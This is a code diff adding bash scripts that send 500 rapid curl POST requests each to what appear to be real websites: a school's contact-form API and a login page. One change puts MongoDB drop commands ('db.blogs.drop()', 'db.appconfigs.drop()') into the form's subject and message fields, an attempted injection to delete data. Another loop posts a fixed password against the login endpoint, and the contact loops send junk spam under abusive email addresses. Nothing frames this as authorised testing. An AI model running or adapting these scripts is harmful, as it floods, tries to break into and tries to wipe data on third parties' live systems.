@@ -13,8 +13,62 @@ for i in $(seq 1 500); do
             \"name\":\"$i\",
             \"email\":\"fuck$i@u.com\",
             \"phone\":\"9999999999\",
-            \"subject\":\"General Inquiry\",
-            \"message\":\"Zabier $i\"
+            \"subject\":\"db.blogs.drop()\",
+            \"message\":\"db.appconfigs.drop()\"
+        }")
+
+    END=$(date +%s%3N)
+    TIME=$((END-START))
+
+    echo "[$(date '+%H:%M:%S')] Request #$i | HTTP $STATUS | ${TIME}ms"
+done
+
+
+==================
+
+#!/bin/bash
+
+URL="https://ai.croissix.com/login"
+
+for i in $(seq 1 500); do
+    START=$(date +%s%3N)
+
+    STATUS=$(curl -s \
+        -o /dev/null \
+        -w "%{http_code}" \
+        --request POST \
+        --header "Content-Type: application/x-www-form-urlencoded" \
+        --data-urlencode "email=test$i@example.com" \
+        --data-urlencode "password=admin@123" \
+        "$URL")
+
+    END=$(date +%s%3N)
+    TIME=$((END - START))
+
+    printf "[%s] Request #%03d | HTTP %s | %dms\n" \
+        "$(date '+%H:%M:%S')" "$i" "$STATUS" "$TIME"
+done
+
+
+=======================================
+
+#!/bin/bash
+
+URL="https://api.bellezaschool.com/api/v1/contact"
+
+for i in $(seq 1 500); do
+    START=$(date +%s%3N)
+
+    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
+        -X POST "$URL" \
+        -H "Content-Type: application/json" \
+        -d "{
+            \"type\":\"general_inquiry\",
+            \"name\":\"$i\",
+            \"email\":\"fuck$i@u.com\",
+            \"phone\":\"9999999999\",
+            \"subject\":\"jskjcvs\",
+            \"message\":\"ljdk nskndsk\"
         }")
 
     END=$(date +%s%3N)
